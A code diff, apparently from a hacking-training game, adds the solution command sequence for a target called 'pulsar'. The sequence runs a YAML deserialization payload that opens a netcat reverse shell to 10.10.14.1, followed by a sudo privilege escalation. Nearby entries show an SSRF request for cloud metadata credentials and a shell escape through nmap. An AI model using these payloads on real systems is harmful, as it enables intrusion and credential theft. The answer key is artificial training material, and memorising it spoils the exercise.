@@ -152,6 +152,12 @@ const SOLUTIONS = {
     "cloudctl cp reverse.sh s3://tempest-deploy/", "cat user.txt", "sudo -l",
     "sudo nmap --interactive", "!sh", "cat /root/root.txt",
   ],
+  // PULSAR : désérialisation YAML (!!python/object/apply:os.system) -> RCE. `exit` d'abord pour écouter.
+  pulsar: [
+    "exit", "nmap 10.10.11.55", "curl http://10.10.11.55:9090/", "nc -lvnp 4444",
+    'curl -d \'!!python/object/apply:os.system ["nc 10.10.14.1 4444 -e /bin/sh"]\' http://10.10.11.55:9090/api/config/import',
+    "cat user.txt", "sudo -l", "sudo timeout 7d /bin/sh", "cat /root/root.txt",
+  ],
   parallax: [
     "nmap 10.10.11.170", "curl http://10.10.11.170/",
     'curl "http://10.10.11.170/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
